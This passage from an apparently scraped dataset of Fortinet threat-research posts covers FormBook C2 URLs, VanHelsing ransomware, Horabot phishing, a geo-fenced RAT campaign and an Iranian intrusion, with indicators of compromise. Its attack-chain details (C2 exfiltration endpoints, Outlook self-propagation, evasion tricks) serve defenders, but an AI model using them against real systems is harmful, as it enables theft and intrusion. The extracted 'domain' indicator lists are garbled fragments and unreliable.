yc[.]info/txra/hxxp://www[.]sbualdwhryi[.]info/dbdy/hxxp://www[.]xrrkkv[.]info/eg97/hxxp://www[.]08081[.]pink/2wr9/hxxp://www[.]jyc11[.]top/xz2s/hxxp://www[.]kdjsswzx[.]club/h3ut/hxxp://www[.]gnlokn[.]info/lmor/hxxp://www[.]btbjpu[.]info/pjhe/hxxp://www[.]bellysweep[.]net/gr1r/hxxp://www[.]dilgxp[.]info/7qht/hxxp://www[.]leveledge[.]sbs/asbs/hxxp://www[.]ethereumpartner[.]xyz/xou3/hxxp://www[.]choujiezhibo[.]net/pu7t/hxxp://www[.]domuss[.]asia/yf4f/hxxp://www[.]seasay[.]xyz/xwy3/hxxp://www[.]tumbetgirislinki[.]fit/i8hk/hxxp://www[.]ef4refef[.]sbs/f88b/hxxp://www[.]aicycling[.]pro/4m7q/hxxp://www[.]autonomousrich[.]xyz/iej0/ FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign",
      "scraped_at": "2025-07-20T13:41:46.052208",
      "indicators": {
        "ip_address": [],
        "domain": [
          "LNG4cmd",
          "andboxierpcss",
          "ser32",
          "egmon",
          "otepad",
          "erl",
          "ireshark",
          "uiUnattend",
          "zbtfb3",
          "etmon",
          "rypt32",
          "tdll",
          "mwareservice",
          "aultcli",
          "hell32",
          "insqlite3",
          "le32",
          "rocmon",
          "est",
          "ookies",
          "csunattend",
          "spaint",
          "aitfor",
          "ontview",
          "ilemon",
          "qlite3",
          "mwareuser",
          "ernel32",
          "orfiles",
          "strtmgr",
          "hkntfs",
          "andboxiedcomlaunch",
          "ython",
          "piScaling",
          "hoami",
          "dvapi32",
          "magingDevices",
          "xplorer",
          "ttune"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2017-11882"
        ],
        "email": [],
        "url": [
          "http://test.com/test.ps1XLNG",
          "http://test.com/test.exeXLNG"
        ]
      },
      "threat_score": 0.2512176365034607
    }
  },
  {
    "id": "Fortinet_59659",
    "source": "Fortinet",
    "title": "Ransomware Roundup – VanHelsing",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the VanHelsing ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands a ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the VanHelsing ransomware was made available on a publicly available file-scanning site in mid-March 2025. Like other ransomware attacks, VanHelsing demands a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the VanHelsing ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the VanHelsing ransomware (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) takes the following command line arguments: The VanHelsing ransomware then encrypts files on the compromised machines and adds the file extension “.vanlocker” to affected files. Note that although this VanHelsing variant (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) uses “.vanlocker” as its extension, it still belongs to the VanHelsing ransomware family because it uses the same ransom negotiation and data leak sites as another VanHelsing variant. (SHA2: 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17) This other variant adds a “.vanhelsing” file extension to the files it encrypts. The VanHelsing ransomware exempts the following files: autofun.inf bootfont.bin bootsect.bak desktop.ini ntuser.dat.log GDIPFONTCACHEV1. DAT iconcache.db d3d9caps.dat It also avoids encrypting files with the following file extensions: .deskthemepack The VanHelsing ransomware avoids encrypting files in the following folders: $Recycle. Bin $RECYCLE. BIN System Volume Information Trend Micro program files program files(x86) tor browser It also creates the following mutex: It may also modify the registry key Software\\Classes\\.vanlocker\\DefaultIcon to use a custom icon for . VANLOCKER files. However, we did not observe this VanHelsing ransomware sample change the file icon of the encrypted files in our testing. It then drops the following ransom note in “README.txt”: The ransom note directs victims to chat sites operated by the attacker on TOR, where ransom negotiation takes place. The ransomware also replaces the desktop wallpaper with its own. The VanHelsing ransomware operates a TOR site where the group posts the information it has stolen from its victims. At the time of our initial investigation in late March 2025, six victims were on the data leak site, and they had added one more victim when we checked back in mid-April. Our analysis of the VanHelsing ransomware victims listed on the data leak site found: Note that victims who have paid the ransom may have been removed from the data leak site. As such, additional companies may have been affected by the VanHelsing ransomware. The VanHelsing ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. VanHelsing Ransomware File IOCs 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17 VanHelsing ransomware Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-vanhelsing",
      "scraped_at": "2025-07-20T13:41:54.518553",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ootsect",
          "ootfont",
          "esktop",
          "tuser",
          "EADME",
          "3d9caps",
          "concache",
          "utofun"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98",
          "86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6591337099811676
    }
  },
  {
    "id": "Fortinet_51806",
    "source": "Fortinet",
    "title": "Horabot Unleashed: A Stealthy Phishing Threat",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High In April, FortiGuard Labs observed a threat actor using phishing emails with malicious HTML files to spread Horabot, malware that primarily targets Spanish-speaking users. It is known for using crafted emails that impersonate invoices or financial documents to trick victims into opening malicious attachments and can steal email credentials, harvest contact lists, and install banking trojans. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Horabot leverages Outlook COM automation to send phishing messages from the victim’s mailbox, enabling it to propagate laterally within corporate or personal networks. The threat actor also executed a combination of VBScript, AutoIt, and PowerShell to conduct system reconnaissance, credential theft, and the installation of additional payloads. Based on the telemetry gathered by FortiGuard Labs, these attacks target users in Latin America, including Mexico, Guatemala, Colombia, Peru, Chile, and Argentina. To trick the recipient into opening the email and attachment, it is written in Spanish from a “legitimate” sender in Mexico, and its subject line references an attached invoice (Factura Adjunta). The message claims to include a PDF invoice for acquired services or products and urges the user to open the attachment. However, the attached ZIP file contains a malicious HTML file with Base64 encoded data in the “iframe” tag. This decoded data is also HTML data with a remote URL “hxxps://t4[.]contactswebaccion[.]store/0704/” used to download the next payload. The URL leads to a web page with JavaScript that immediately attempts to download the hard-coded ZIP file “ADJUNTOS_23042025.zip.” The file “ADJUNTOS_23042025.zip” contains an HTA file with a large number of unused strings in the <body>. The <script> tag uses “moveTo(7426, 6245),” a browser redirection trick that repositions the window. It then loads a script from “hxxps://d1[.]webcorreio[.]pics/LNIJGPNIPPK/WWGDI.” The script on the remote server injects an external VBScript hosted at “hxxps://dl[.]webcorreio[.]pics/g1/.” This VBScript is appended into the HTML <head> element, enabling stealthy execution within the user's browser context. The script serves to check the victim’s environment and deliver additional payloads. The VBScript at “hxxps://dl[.]webcorreio[.]pics/g1/” implements a custom string-decoded routine by processing every two characters, performing mathematical transformations, and reconstructing hidden strings, such as URLs, PowerShell commands, or other instructions. This method helps the malware evade static detection by keeping its real behavior hidden until execution. The following are the main tasks in this script, along with a screenshot of the decoded string: 1. Environment Detection and Evasion 2. Folder Preparation:It checks the working directory and if “C:\\Users\\Public\\LAPTOP-0QF0NEUP” does not exist, it creates it. Otherwise, it quits the script to avoid potential re-infection. 3. Collection and Exfiltration:This process collects the victim's basic information by grabbing the local IP address, computer name, username, and Windows version. It then sends the collected data via HTTP POST to “hxxps://d1[.]webcorreio[.]pics/g1/ctld/salvar.php.” 4. Preparation for AutoIt 5. Preparation for PowerShell:Creates a Batch script (.bat) to decode a text file (.tws) for executing a PowerShell script from “hxxps://labodeguitaup[.]space/a/08/150822/au/au.” This script is responsible for spreading phishing mail. 6. Persistence:First, it deletes all .lnk, .cmd, .bat, .exe, .vbs, and .tws files in the %Startup% and %AppData% folders. It then creates a new shortcut .lnk file pointing to the hidden dropped files related to the AutoIt payload (winupdate_version_686.exe with .ai arguments). It also sets the .lnk file to execute the Batch script during system startup for the PowerShell script. 7. Execution and Cleanup:It executes the created shortcuts via PowerShell commands using ExecutionPolicy Bypass to avoid script execution restrictions and kills mshta.exe. In the following sections, we’ll elaborate on the activities delivered by the encrypted data and the remote PowerShell. The AutoIt script “winupdate_version_067.ai” is for decryption. It finds the “.ia” file in the same directory, decrypts it with the hard-coded key “99521487,” injects the decrypted malicious DLL, and executes the entry point at “B080723_N.” The DLL begins by collecting system information from the victim’s machine, including the current date and time, operating system version, username, hostname, and installed antivirus software. It then sends this data via a POST request to the C2 server “hxxp://209[.]74[.]71[.]168/on7all/index15.php.” The exfiltrated data is organized into two parameters: AT, which carries information such as timestamp, OS type, and user identity, and MD, which specifically identifies the presence and name of antivirus software. This structured telemetry allows the attacker to profile infected systems. The malware then proceeds to steal browser-related data from a range of targeted web browsers, including Brave, Yandex, Epic Privacy Browser, Comodo Dragon, Cent Browser, Opera, Microsoft Edge, and Google Chrome. Once the data is collected, it is exfiltrated to the remote server at “hxxp://93[.]127[.]200[.]211/a/08/150822/au/logs/index.php? CHLG.” In addition to data theft, Horabot monitors the victim’s behavior and injects fake pop-up windows designed to capture sensitive user login credentials. These overlay windows are embedded within the RCData section of the decrypted malicious DLL, enabling stealthy deployment and execution without relying on external visual components. The target script on “hxxps://labodeguitaup[.]space/a/08/150822/au/au” in the previous VBScript intends to execute another six scripts at the remote server “hxxp://93[.]127[.]200[.]211/a/08/150822/au”: “app,” “a2,” “a3,” “a4,” “a5,” and “a6.” For unknown reasons, the “a5” file is empty, but the rest of the files can achieve a full cycle of building a victim list, email automation, and efficient Horabot payload delivery. The “app” acts as an infection check, checking whether a marker file (C:\\Users\\Public\\d240425) exists and exiting if it does. It then forcefully terminates any running instance of Outlook (Outlook.exe) to ensure it can launch Outlook cleanly using a COM object. Then, after creating an Outlook. Application object and accessing its MAPI namespace, it initializes an empty list to collect email addresses and defines a blocked domain list—“gmail,” “hotmail,” “outlook,” “edu,” “con.mx,” and “facebook”—which avoids collecting personal, academic, and Facebook-related emails. The “a2” script contains two functions to build a list of email addresses. The first function is designed to scan the contact data within Outlook’s AddressLists. For each contact, it checks the AddressEntryUserType to determine whether the email address can be directly retrieved or must be resolved via GetExchangeUser() to extract the primary SMTP address. The second function recursively traverses all folders in the Outlook mailbox structure, extracting and filtering email addresses from both recipients and senders of each message using the same logic. The “a3” script saves collected addresses in the “APPDATA\\Microsoft\\. Outlook” to reduce visibility and transmits the email list to an external server, “labodeguitaup[.]space.” It then fetches a payload from another server, “93[.]127[.]200[.]211,” and converts the response content to Base64 for later use. This routine indicates the malware is not only gathering target data but also preparing for future interactions or customized delivery stages. The “a4” script constructs and delivers malicious emails disguised as legitimate invoices. It saves the payload from server “93[.]127[.]200[.]211” with a “. PDF.html” filename and compresses it into a .zip archive that mimics a standard invoice attachment. It then prepares to send this archive as an attachment via Outlook. It references the extracted email address, excluding known domains like Gmail, Yahoo, Hotmail, .edu, Facebook, and .con.mx through the “Verificar-PalavrasBloqueadas” function (Check-BlockedWords). For each valid target, it creates an email item with a subject line referencing a “FWD Factura Adjunta” (FWD Invoice Attached), a Spanish-language body message about the attached invoice, and the malicious zip archive as an attachment. After the emails are sent, the script “a6” removes all traces and deletes related files, reducing the chances of being detected. Horabot is a growing threat demonstrating how phishing attacks are becoming more advanced, especially in Latin America. It spreads through fake Spanish-language emails pretending to be invoices, tricking people into opening harmful attachments. The malware uses VBScript, AutoIt, and PowerShell to hide itself, steal login credentials, and collect email contacts. It then uses Outlook to send itself to more victims, spreading through companies and personal networks. Because it is designed to blend in with normal Windows and Outlook behavior, it can be hard to notice. Organizations should block suspicious emails, watch for unknown file activity, and educate employees to be cautious with phishing scams. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.683A!trHTML/Agent.9DFA!trAutoIt/Agent. HA!trBAT/Agent. PR!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. t4[.]contactswebaccion[.]storef5[.]contactswebaccion[.]spacelabodeguitaup[.]space209[.]74[.]71[.]16893[.]127[.]200[.]211d1[.]webcorreio[.]picsupdatec[.]lat SHA256SCRIPT 523d7e9005b2e431068130989caf4a96062a029b50a5455d37a2b88e6d04f83d84d77737196ea5a8cb0efd8fc3ea61a878d1e1851cc63bcb1e0868019c71996f13a5c60a799c104a7bb1ff1489b82031c2ea1ed10712ca019e996fc0e37e9dfa2ba471519bed0a5503408fee0593bc13547c88cfb10872a9739c2b1eaa5a287ca885b89bb145dde56f6b63fcbf3560fb7179df43df5d212217ca583405beceb8 25be06643204fc7386db3af84b200d362c3287b30c7491b666c4fe821a8c6eb45368f9f0994b28295aaf7d7af586d78827a95c6eb359a3921ebaa8d2fe1c98a9f7140c28921dcf9ac542965a37b5473432f39b34f00161b6f0c0f8af7c9551a5 265a11951f6ac1fd1f150d2711e0158a59416dd709759b39904470f44c83272a370ccca7392282056f20b45829d0cac92acacfc07ab9699c54b3695649713854 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/horabot-unleashed-a-stealthy-phishing-threat",
      "scraped_at": "2025-07-20T13:42:03.039074",
      "indicators": {
        "ip_address": [],
        "domain": [
          "shta",
          "ndex15",
          "utlook",
          "ndex",
          "DF",
          "on",
          "alvar"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.25913621262458475
    }
  },
  {
    "id": "Fortinet_21498",
    "source": "Fortinet",
    "title": "Multilayered Email Attack: How a PDF Invoice and Geo-Fencing Led to RAT Malware",
    "text": "FortiGuard Labs Threat Research Affected platforms:Windows (primarily), Linux & macOS (if Java is installed)Impacted parties:Users on systems with Java Runtime Environment (JRE) installedImpact:Grants remote access to attackers, enabling them to execute commands, log keystrokes, access files, activate webcam/microphone, and fully control the infected systemSeverity level:High The FortiMail IR team recently uncovered a new email campaign distributing a Remote Access Trojan (RAT) using multiple evasion techniques to target organizations in Spain, Italy, and Portugal. The campaign leverages theserviciodecorreoemail service provider, which is configured as an authorized sender for various domains and successfully passes SPF validation. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Additionally, it employs advanced evasion strategies, including the abuse of two file-sharing platforms, geolocation filtering, and Ngrok to create secure, obfuscated tunnels. These tactics further complicate detection and effectively mask the attack's true origin, ultimately facilitating the distribution of RATty malware. This campaign highlights the increasing sophistication of malware attack methodologies, leveraging the legitimate functionalities of remote administration tools for malicious purposes. The attacker exploits serviciodecorreo.es, a legitimate Spanish email service authorized to send emails on behalf of various domains. Since the SPF record for these domains designates serviciodecorreo.es as a valid sender, the malicious emails successfully pass SPF checks, creating the illusion of legitimacy. Consequently, these emails are more likely to bypass security filters, making it easier for them to be accepted by the recipient's mail server. This increases the likelihood of a successful attack, as the deceptive nature of the emails goes unnoticed. The sender attaches a PDF file asking the recipient to review two new invoices. This makes the recipient believe this email is important, which may influence them to check the attached files and details. This is basic social engineering to tempt the recipient into acting with less caution and under pressure. The attached PDF file displays a message indicating that the file is not being shown correctly and instructs the recipient to click a button to download the file locally. The button contains a Dropbox (file-sharing platform) link to download an HTML file named \"Fattura\" (Translation: “Invoice”). The choice of this file name plays into the social engineering tactic, aiming to persuade the recipient to click and view the information, ultimately leading to the delivery of a malicious payload. The HTML file contains a basic validation step with an \"I am not a robot\" prompt. After completing the verification, a simple HTML page is displayed with instructions to click a button to view the document. The button redirects the user to a link generated by Ngrok, a tunneling tool that allows users to expose local servers to the internet through secure, temporary URLs. The following URL abuses the MediaFire file-sharing platform by automatically downloading the JAR file (FA-43-03-2025.jar) when accessed. hxxps://download1528[.]mediafire[.]com/35ougpab4uhgHgb3Pmqh8niQ0hzS9b-TtTro5oPV5iUIULfNckqgXvjXQ6aTp-NF-k8EflSnFWC--Ffh4aX1NlYrzaPzgFlyxHVe0fKkLE1p3u5cntfU25orm92QdoQmXE9-gyI4hRgSYpaNcd3o12kJnPRbJhD3aqbl1Qx3vqbUtk8/ayp0ikmndrdseht/FA-43-03-2025.jar Using a legitimate file-sharing service helps attackers further evade detection, as security filters are less likely to flag downloads from trusted platforms. This tactic makes detection and blocking more difficult for security companies since automated analysis systems, sandbox environments, and security researchers often inspect URLs from locations outside the targeted region. By selectively delivering the malware only to specific geolocations, attackers reduce the risk of early detection and increase the likelihood of a successful attack. Below, we can see how this evasion leads to a Google Drive link containing a legitimate file: Ngrok is primarily used to test webhooks, develop locally hosted applications, and bypass NAT/firewall restrictions. However, as in this case, threat actors can misuse Ngrok to create dynamic, hard-to-detect phishing links that evade traditional security filters. Attackers use Ngrok to dynamically generate URLs that help them evade email security filtering mechanisms. One key technique they employ is geo-based cloaking, which serves different content depending on the user's location. In this case, when users access the Ngrok-generated URL from any country except Italy, they are redirected to a seemingly legitimate Google Drive document, making it harder for email security solutions to classify the URL as malicious. The attached fake invoice is identical for all targeted organizations. It is a purported invoice from the global health organization Medinova Health Group, and it has been designed to bypass most email security mechanisms. The seemingly legitimate invoice, shared via Google Drive, is unlikely to raise suspicion during email scanning and is intended to slip past email security engines without triggering any suspicion of malicious intent. However, when the request originates from Italy, the URL changes entirely, leading to downloading a malicious JAR file. Most email security systems perform email analysis from generic or cloud-based environments, not tied to a specific geographic location. As a result, when these systems access the embedded URL, they are redirected to a harmless decoy page rather than the malicious file. This geofencing technique ensures that only users in the targeted regions -in this case, Italy - can reach the actual malicious content. The .jar file contains a type ofRattymalware. The file name, \"FA-43-03-2025.jar,\" resembles a neutral reference number. While such naming conventions are not unusual, this name was probably specifically chosen to prompt the end user to click and execute the file, assuming it is related to a payment document, thus encouraging hasty and careless action. Ratty RAT is a Java-based Remote Access Trojan (RAT) typically distributed as a .jar file. Since Java is a cross-platform language, Ratty RAT can run on various operating systems as long as the Java Runtime Environment (JRE) is installed. Threat actors use Ratty RAT to execute remote commands, log keystrokes, capture screenshots, and steal sensitive data, often as part of email-based social engineering campaigns with malicious attachments. While it is commonly delivered as a .jar file, attackers may also package it as an MSI (Microsoft Installer) file to increase its legitimacy and evade detection. By bundling the RAT inside an MSI, they can disguise it as legitimate software or an update, making it easier to trick users into executing the malware. What makes this email campaign particularly sophisticated is its combination of multiple tactics designed to evade detection and exploit trusted platforms. Its multi-layered strategy uses social engineering techniques to manipulate recipients into clicking on malicious links. The initial email, disguised as an invoice and sent from a sender who appears legitimate, serves as the entry point. The attacker clearly conducted prior research, identifying which domains allow the use of the specific email service for sending emails, thereby bypassing some critical security measures. The attackers also abuse file-sharing platforms like Dropbox and MediaFire to deliver their malicious payload while leveraging geolocation techniques to tailor the attack based on the recipient's location. Additionally, the use of Ngrok complicates detection by creating secure, obfuscated tunnels that mask the true origin of the attack. Together, these elements create a highly advanced and effective method of distributing malware, including RATty (Remote Access Trojan), which is challenging for traditional security systems to detect and block. Fortinet provides multiple layers of protection against this threat. FortiGate and FortiClient detect and block the malicious JAR file using the latest antivirus (AV) signatures. Customers are advised to ensure their systems are regularly updated with the most recent AV database. Fortinet customers are also already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services. FortiMail recognizes the phishing email as “virus detected,” and the FortiMail Content Disarm and Reconstruction (CDR) function automatically detects and mitigates this threat. In addition, FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides real-time anti-phishing protection against known and unknown phishing attempts. Perception Point Email Security, now part of Fortinet FortiMail, also proactively detects and blocks emails containing malicious geo-fenced URLs used to deliver malware and phishing content and the RATty JAR file itself. This is achieved through advanced dynamic scanning and static analysis techniques. Combined, these detection capabilities ensure threats are mitigated during delivery, through malicious emails and links, and upon download, delivering end-to-end protection across the entire attack chain. In addition to technical defenses, organizations should adopt Security Awareness Training (SATs) programs and conduct regular phishing simulations. Fortinet’s freeNSE training:NSE 1 – Information Security Awarenessmodule on Internet threats is designed to help end users learn how to identify and protect themselves from phishing attacks. TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. By empowering users to recognize and respond to suspicious content, these initiatives significantly lower the risk of successful phishing or malware attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. You can alsosign upto receive future alerts to stay informed of new and emerging threats. 143.47.53.106130.51.20.126199.232.214.172199.232.210.172 jw8ndw9ev[.]localto[.]netl5ugb6qxh[.]localto[.]net Hash (sha256): a1c2861a68b2a4d62b6fbfc7534f498cefe5f92f720466d24ae1b66ebc9f5731d20d14792c91107f53318ff7df83b9cd98acd3c394959a74e72278682822b6009184ff2cdd05fcaf111db23123479c845b2ece2fedccc2524b2de592f99808765f897fec78e2fd812eb3bc451222e64480a9d5bc97b746cc0468698a634708806153c80b17cb990caad1d80cac72c867d4ecfa1a84b7ab286b7373cd4168794e469b8911fd1ae2ded8532a50e9e66b8d54820c18ccdba49d7a38850d6af54475af8b6ac45918bc87d2a164fae888dab6e623327cba7c2409e4d0ef1dde8d1793 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware",
      "scraped_at": "2025-07-20T13:42:10.065457",
      "indicators": {
        "ip_address": [],
        "domain": [
          "erviciodecorreo",
          "A-43-03-2025"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.38358008075370137
    }
  },
  {
    "id": "Fortinet_73672",
    "source": "Fortinet",
    "title": "FortiGuard Incident Response Team Detects Intrusion into Middle East Critical National Infrastructure",
    "text": "FortiGuard Labs Threat Research The FortiGuard Incident Response (FGIR) team recently investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East, attributed to an Iranian state-sponsored threat group. The attack involved extensive espionage operations and suspected network prepositioning—a tactic often used to maintain persistent access for future strategic advantage. Full Report Available:The following article provides key findings, but a full report of this activity is availablehere. The report includes an analysis of novel malware deployed throughout the intrusion, a detailed breakdown of adversary TTPs across different attack stages, Indicators of Compromise (IOCs) to assist defenders, and attribution considerations for deeper insight. The intrusion persisted from at least May 2023 to February 2025, with signs of compromise dating back as far as May 2021. Attackers initially gained access via stolen VPN credentials and established persistence through multiple web shells and backdoors, including Havoc, HanifNet, HXLibrary, and NeoExpressRAT. They bypassed network segmentation using open-source proxying tools like plink, Ngrok, glider proxy, and ReverseSocks5. Key insights from the investigation include: The attack unfolded in four distinct phases: 1. Establishing a Foothold and Initial Operations (May 2023 – April 2024)The adversary used stolen credentials to access the victim’s SSL VPN, deploying web shells on public-facing servers and installing Havoc, HanifNet, and HXLibrary backdoors. They then stole credentials and moved laterally using RDP and PsExec. 2. Consolidating the Foothold (April 2024 – November 2024)Additional persistence mechanisms were introduced, including NeoExpressRAT. The adversary chained proxies (plink, Ngrok) to bypass segmentation, exfiltrated targeted email data, and began interacting with virtualization infrastructure. 3. Initial Remediation and Adversary Response (November 2024 – December 2024)The victim implemented initial containment steps, prompting a surge in adversary activity. To maintain access, additional web shells, SystemBC, and MeshCentral were deployed, with a focus on targeting deeper CNI network segments. 4. Intrusion Containment and Final Adversary Response (December 2024 – Present)The victim successfully removed adversary access. In response, attackers attempted to re-enter via vulnerabilities in web applications and launched targeted phishing campaigns to steal credentials. Multiple failed access attempts were detected. The victim organization had a highly segmented network, including a restricted Operational Technology (OT) environment. While no confirmed disruption to OT systems was found, FGIR observed targeted reconnaissance and credential harvesting, indicating strong adversary interest in these systems. The attackers moved from IT to restricted segments by chaining proxy tools and implants to bypass segmentation. The attacker relied on VPS-hosted infrastructure, avoiding U. S.-based providers. Notable malware variants used include: State-sponsored cyber adversaries continue to target and compromise critical infrastructure networks, seeking to maintain persistent access. Organizations should prioritize the following defensive measures: This investigation highlights the persistent and evolving nature of state-backed cyber threats targeting Middle Eastern CNIs. The adversary demonstrated advanced tactics to deeply embed themselves, evade detection, and sustain long-term access. Despite containment efforts, the adversary has continued efforts to regain access, indicating a long-term strategic interest in this environment. Organizations must remain vigilant, continuously refining their detection and response strategies to defend against sophisticated, state-sponsored cyber campaigns. For adetailed breakdown of adversary TTPs, novel malware, and IOCs, access the full reporthere. incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-incident-response-team-detects-intrusion-into-middle-east-critical-national-infrastructure",
      "scraped_at": "2025-07-20T13:42:17.709611",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2798507462686567
    }
  },
  {
    "id": "Fortinet_16041",
    "source": "Fortinet",
    "title": "Key Takeaways from the 2025 Global Threat Landscape Report",
